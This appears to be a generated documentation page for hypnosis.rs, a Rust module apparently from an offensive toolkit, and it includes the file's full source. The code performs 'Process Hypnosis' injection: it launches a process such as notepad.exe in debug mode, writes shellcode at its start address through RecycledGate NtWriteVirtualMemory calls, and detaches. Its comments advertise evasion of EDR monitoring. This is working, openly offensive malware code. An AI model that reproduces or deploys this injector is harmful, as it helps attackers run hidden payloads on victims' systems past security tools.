# crowd — hypnosis.rs  (🔥 S TIER — NtWriteVirtualMemory + NtClose via RecycledGate, debug API irreducible)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/hypnosis.rs` |
| **Lines** | 296 |
| **Tier** | N |
| **Cards** | T007-process-injection |
| **Role** | Hypnosis injection |
| **Unsafe blocks** | 14 |

## Purpose

# crowd — hypnosis.rs  (🔥 S TIER — NtWriteVirtualMemory + NtClose via RecycledGate, debug API irreducible)

## Process Hypnosis (OPSEC 8.5)

Creates a process with `DEBUG_ONLY_THIS_PROCESS`, intercepts 7 debug
events (CREATE_PROCESS, CREATE_THREAD, LOAD_DLL × 4, EXCEPTION_BREAKPOINT),
then writes shellcode at `lpStartAddress` and detaches the debugger.

This avoids the classic `CreateRemoteThread` / `QueueUserAPC` patterns
that EDRs specifically monitor.  The injection happens via the debug
interface which is rarely hooked.

Key OPSEC advantages:
- No `VirtualAllocEx` / `VirtualProtectEx` calls (writes to existing RWX)
- No `CreateRemoteThread` or `NtCreateThreadEx`
- Process starts "normally" through its own lpStartAddress
- `DebugActiveProcessStop` cleanly detaches — no residual debug state

## Constants

- `DEBUG_ONLY_THIS_PROCESS`: `u32` = `0x00000002`
- `CREATE_PROCESS_DEBUG_EVENT`: `u32` = `3`
- `CREATE_THREAD_DEBUG_EVENT`: `u32` = `2`
- `LOAD_DLL_DEBUG_EVENT`: `u32` = `6`
- `EXCEPTION_DEBUG_EVENT`: `u32` = `1`
- `EXCEPTION_BREAKPOINT`: `u32` = `0x80000003`
- `DBG_CONTINUE`: `u32` = `0x00010002`
- `EVENTS_BEFORE_INJECT`: `usize` = `7`
- `PAGE_READWRITE`: `u32` = `0x04`
- `PAGE_EXECUTE_READ`: `u32` = `0x20`

## Types

### struct `STARTUPINFOW` (line 43)

### struct `PROCESS_INFORMATION` (line 52)

### struct `DEBUG_EVENT` (line 60)

### struct `CREATE_PROCESS_DEBUG_INFO` (line 75)

## Public API

### `hypnotize_and_inject` (line 119)
```rust
pub fn hypnotize_and_inject(target_exe: &str, shellcode: &[u8]) -> Result<u32, String>
```
Injects shellcode via Process Hypnosis.

# Arguments
* `target_exe` — Path to the target executable (e.g. `notepad.exe`)
* `shellcode`  — The payload to inject at lpStartAddress

# Returns
`Ok(pid)` of the created process on success, `Err` on failure.

### `hypnotize_default` (line 294)
```rust
pub fn hypnotize_default(shellcode: &[u8]) -> Result<u32, String>
```
Default target for hypnosis injection.

## Internal Functions

- `CreateProcessW` (line 91)
- `WaitForDebugEvent` (line 104)
- `ContinueDebugEvent` (line 105)
- `DebugActiveProcessStop` (line 106)

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — hypnosis.rs  (🔥 S TIER — NtWriteVirtualMemory + NtClose via RecycledGate, debug API irreducible)
//!
//! ## Process Hypnosis (OPSEC 8.5)
//!
//! Creates a process with `DEBUG_ONLY_THIS_PROCESS`, intercepts 7 debug
//! events (CREATE_PROCESS, CREATE_THREAD, LOAD_DLL × 4, EXCEPTION_BREAKPOINT),
//! then writes shellcode at `lpStartAddress` and detaches the debugger.
//!
//! This avoids the classic `CreateRemoteThread` / `QueueUserAPC` patterns
//! that EDRs specifically monitor.  The injection happens via the debug
//! interface which is rarely hooked.
//!
//! Key OPSEC advantages:
//! - No `VirtualAllocEx` / `VirtualProtectEx` calls (writes to existing RWX)
//! - No `CreateRemoteThread` or `NtCreateThreadEx`
//! - Process starts "normally" through its own lpStartAddress
//! - `DebugActiveProcessStop` cleanly detaches — no residual debug state

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
#[allow(unused_imports)]
use crate::mega_dbg;

// ── Constants ─────────────────────────────────────────────────────────────

const DEBUG_ONLY_THIS_PROCESS: u32 = 0x00000002;
const CREATE_PROCESS_DEBUG_EVENT: u32 = 3;
const CREATE_THREAD_DEBUG_EVENT: u32 = 2;
const LOAD_DLL_DEBUG_EVENT: u32 = 6;
const EXCEPTION_DEBUG_EVENT: u32 = 1;
const EXCEPTION_BREAKPOINT: u32 = 0x80000003;
const DBG_CONTINUE: u32 = 0x00010002;

/// Number of debug events to intercept before injecting.
/// CREATE_PROCESS(1) + LOAD_DLL(ntdll=2, kernel32=3, kernelbase=4, ...) + possible EXCEPTION(5,6,7)
const EVENTS_BEFORE_INJECT: usize = 7;

// ── Win32 structures (minimal) ────────────────────────────────────────────

#[repr(C)]
struct STARTUPINFOW {
    cb: u32,
    _reserved: [u8; 68 - 4], // Pad to full size
    #[cfg(target_arch = "x86_64")]
    _pad64: [u8; 36],        // Extra padding for x64
}

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct PROCESS_INFORMATION {
    hProcess: usize,
    hThread: usize,
    dwProcessId: u32,
    dwThreadId: u32,
}

#[repr(C)]
struct DEBUG_EVENT {
    dwDebugEventCode: u32,
    dwProcessId: u32,
    dwThreadId: u32,
    u: DebugEventUnion,
}

#[repr(C)]
union DebugEventUnion {
    CreateProcessInfo: CREATE_PROCESS_DEBUG_INFO,
    _raw: [u8; 160],
}

#[repr(C)]
#[derive(Copy, Clone)]
struct CREATE_PROCESS_DEBUG_INFO {
    hFile: usize,
    hProcess: usize,
    hThread: usize,
    lpBaseOfImage: *mut c_void,
    dwDebugInfoFileOffset: u32,
    nDebugInfoSize: u32,
    lpThreadLocalBase: *mut c_void,
    lpStartAddress: *mut c_void,
    lpImageName: *mut c_void,
    fUnicode: u16,
}

// ── Extern declarations ───────────────────────────────────────────────────

extern "system" {
    fn CreateProcessW(
        lpApplicationName: *const u16,
        lpCommandLine: *mut u16,
        lpProcessAttributes: *mut c_void,
        lpThreadAttributes: *mut c_void,
        bInheritHandles: i32,
        dwCreationFlags: u32,
        lpEnvironment: *mut c_void,
        lpCurrentDirectory: *const u16,
        lpStartupInfo: *mut c_void,
        lpProcessInformation: *mut PROCESS_INFORMATION,
    ) -> i32;

    fn WaitForDebugEvent(event: *mut DEBUG_EVENT, ms: u32) -> i32;
    fn ContinueDebugEvent(pid: u32, tid: u32, status: u32) -> i32;
    fn DebugActiveProcessStop(pid: u32) -> i32;
}

// ── Public API ────────────────────────────────────────────────────────────

/// Injects shellcode via Process Hypnosis.
///
/// # Arguments
/// * `target_exe` — Path to the target executable (e.g. `notepad.exe`)
/// * `shellcode`  — The payload to inject at lpStartAddress
///
/// # Returns
/// `Ok(pid)` of the created process on success, `Err` on failure.
pub fn hypnotize_and_inject(target_exe: &str, shellcode: &[u8]) -> Result<u32, String> {
    mega_dbg!("Hypnosis: creating '{}' with DEBUG_ONLY_THIS_PROCESS", target_exe);

    // Wide string for CreateProcessW
    let mut path_wide: Vec<u16> = target_exe.encode_utf16().chain(std::iter::once(0)).collect();

    let mut pi = PROCESS_INFORMATION::default();
    let mut si: Vec<u8> = vec![0u8; std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOW>()];

    // Set cb field
    unsafe {
        *(si.as_mut_ptr() as *mut u32) = si.len() as u32;
    }

    // Create process in debug mode
    let ok = unsafe {
        CreateProcessW(
            null_mut(),
            path_wide.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            DEBUG_ONLY_THIS_PROCESS,
            null_mut(),
            null_mut(),
            si.as_mut_ptr() as *mut c_void,
            &mut pi,
        )
    };

    if ok == 0 {
        return Err(format!("Hypnosis: CreateProcessW('{}') failed", target_exe));
    }

    mega_dbg!("Hypnosis: process created — PID={} TID={}", pi.dwProcessId, pi.dwThreadId);

    let mut start_address: *mut c_void = null_mut();

    // Intercept debug events
    for i in 0..EVENTS_BEFORE_INJECT {
        let mut dbg: DEBUG_EVENT = unsafe { std::mem::zeroed() };

        if unsafe { WaitForDebugEvent(&mut dbg, 5000) } == 0 {
            mega_dbg!("Hypnosis: WaitForDebugEvent timeout at event #{}", i);
            break;
        }

        match dbg.dwDebugEventCode {
            CREATE_PROCESS_DEBUG_EVENT => {
                let info = unsafe { dbg.u.CreateProcessInfo };
                start_address = info.lpStartAddress;
                mega_dbg!(
                    "Hypnosis: CREATE_PROCESS — PID={} lpStartAddress={:p}",
                    dbg.dwProcessId, start_address
                );
            }
            CREATE_THREAD_DEBUG_EVENT => {
                mega_dbg!("Hypnosis: CREATE_THREAD event #{}", i);
            }
            LOAD_DLL_DEBUG_EVENT => {
                mega_dbg!("Hypnosis: LOAD_DLL event #{}", i);
            }
            EXCEPTION_DEBUG_EVENT => {
                mega_dbg!("Hypnosis: EXCEPTION event #{}", i);
            }
            _ => {
                mega_dbg!("Hypnosis: debug event code={} #{}", dbg.dwDebugEventCode, i);
            }
        }

        // On the final event, inject shellcode
        if i == EVENTS_BEFORE_INJECT - 1 {
            if start_address.is_null() {
                // Cleanup
                unsafe {
                    DebugActiveProcessStop(pi.dwProcessId);
                    crate::recycled::nt_close(pi.hProcess);
                    crate::recycled::nt_close(pi.hThread);
                }
                return Err("Hypnosis: lpStartAddress is null".into());
            }

            mega_dbg!(
                "Hypnosis: writing {}B shellcode at lpStartAddress={:p}",
                shellcode.len(), start_address
            );

            // BUG FIX: Change page protection to PAGE_READWRITE before writing.
            // lpStartAddress is typically PAGE_EXECUTE_READ (RX) which causes
            // STATUS_ACCESS_VIOLATION on NtWriteVirtualMemory.
            const PAGE_READWRITE: u32 = 0x04;
            const PAGE_EXECUTE_READ: u32 = 0x20;
            let mut old_protect: u32 = 0;
            let mut region_size: usize = shellcode.len();
            let mut base_addr: *mut c_void = start_address;
            let status = unsafe {
                crate::recycled::nt_protect_virtual_memory(
                    pi.hProcess,
                    &mut base_addr,
                    &mut region_size,
                    PAGE_READWRITE,
                    &mut old_protect,
                )
            };
            if status < 0 {
                unsafe {
                    DebugActiveProcessStop(pi.dwProcessId);
                    crate::recycled::nt_close(pi.hProcess);
                    crate::recycled::nt_close(pi.hThread);
                }
                return Err(format!("Hypnosis: NtProtectVirtualMemory (RW) failed (0x{:08x})", status as u32));
            }

            // Write shellcode via NtWriteVirtualMemory (RecycledGate) — avoids Win32 hook
            let mut written: usize = 0;
            let status = unsafe {
                crate::recycled::nt_write_virtual_memory(
                    pi.hProcess,
                    start_address,
                    shellcode.as_ptr() as *const c_void,
                    shellcode.len(),
                    &mut written,
                )
            };

            if status < 0 {
                unsafe {
                    DebugActiveProcessStop(pi.dwProcessId);
                    crate::recycled::nt_close(pi.hProcess);
                    crate::recycled::nt_close(pi.hThread);
                }
                return Err(format!("Hypnosis: NtWriteVirtualMemory failed (0x{:08x})", status as u32));
            }

            // Restore page protection to PAGE_EXECUTE_READ after writing shellcode
            let mut region_size2: usize = shellcode.len();
            let mut base_addr2: *mut c_void = start_address;
            let mut dummy_old: u32 = 0;
            let status = unsafe {
                crate::recycled::nt_protect_virtual_memory(
                    pi.hProcess,
                    &mut base_addr2,
                    &mut region_size2,
                    PAGE_EXECUTE_READ,
                    &mut dummy_old,
                )
            };
            if status < 0 {
                mega_dbg!("Hypnosis: WARNING — NtProtectVirtualMemory (RX) failed (0x{:08x}), continuing anyway", status as u32);
            }

            mega_dbg!("Hypnosis: shellcode written — detaching debugger");

            // Detach — process resumes and executes the shellcode at its start address
            unsafe { DebugActiveProcessStop(pi.dwProcessId); }

            // Don't continue after detach
            break;
        }

        // Continue to next debug event — use thread ID from the DEBUG_EVENT, not PROCESS_INFORMATION
        unsafe { ContinueDebugEvent(dbg.dwProcessId, dbg.dwThreadId, DBG_CONTINUE); }
    }

    // Close handles via NtClose (RecycledGate)
    unsafe {
        crate::recycled::nt_close(pi.hProcess);
        crate::recycled::nt_close(pi.hThread);
    }

    mega_dbg!("Hypnosis: injection complete — PID={}", pi.dwProcessId);
    Ok(pi.dwProcessId)
}

/// Default target for hypnosis injection.
pub fn hypnotize_default(shellcode: &[u8]) -> Result<u32, String> {
    hypnotize_and_inject(r"C:\Windows\System32\notepad.exe", shellcode)
}

```